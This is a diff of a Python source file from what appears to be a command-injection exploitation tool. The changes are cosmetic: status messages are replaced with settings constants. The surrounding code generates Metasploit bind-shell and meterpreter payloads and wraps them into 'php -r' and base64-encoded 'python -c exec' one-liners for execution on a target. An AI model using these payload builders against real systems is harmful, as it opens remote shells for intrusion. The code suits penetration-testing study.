@@ -261,7 +261,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
       payload = "php/bind_php"
       output = "php_bind_tcp.rc"
 
-      info_msg = "Generating the '" + payload + "' payload... "
+      info_msg = "Generating the '" + payload + "' payload. "
       sys.stdout.write(settings.print_info_msg(info_msg))
       sys.stdout.flush()
       try:
@@ -274,7 +274,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           data = content_file.readlines()
           data = ''.join(data).replace("\n"," ")
 
-        print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
+        print(settings.SUCCESS_STATUS)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -291,7 +291,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
+        print(settings.FAIL_STATUS)
 
       break
 
@@ -352,7 +352,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
       payload = "php/meterpreter/bind_tcp"
       output = "php_meterpreter.rc"
 
-      info_msg = "Generating the '" + payload + "' payload... "
+      info_msg = "Generating the '" + payload + "' payload. "
       sys.stdout.write(settings.print_info_msg(info_msg))
       sys.stdout.flush()
       try:
@@ -365,7 +365,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           data = content_file.readlines()
           data = ''.join(data).replace("\n"," ")
 
-        print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
+        print(settings.SUCCESS_STATUS)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -382,7 +382,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
+        print(settings.FAIL_STATUS)
       break
 
     # Python-bind-shell(meterpreter)
@@ -396,7 +396,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
       payload = "python/meterpreter/bind_tcp"
       output = "py_meterpreter.rc"
 
-      info_msg = "Generating the '" + payload + "' payload... "
+      info_msg = "Generating the '" + payload + "' payload. "
       sys.stdout.write(settings.print_info_msg(info_msg))
       sys.stdout.flush()
       try:
@@ -410,7 +410,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           data = ''.join(data)
           data = base64.b64encode(data)
 
-        print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
+        print(settings.SUCCESS_STATUS)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -427,7 +427,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
         msf_launch_msg(output)
       except:
-        print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
+        print(settings.FAIL_STATUS)
       break
     # Check for available shell options  
     elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
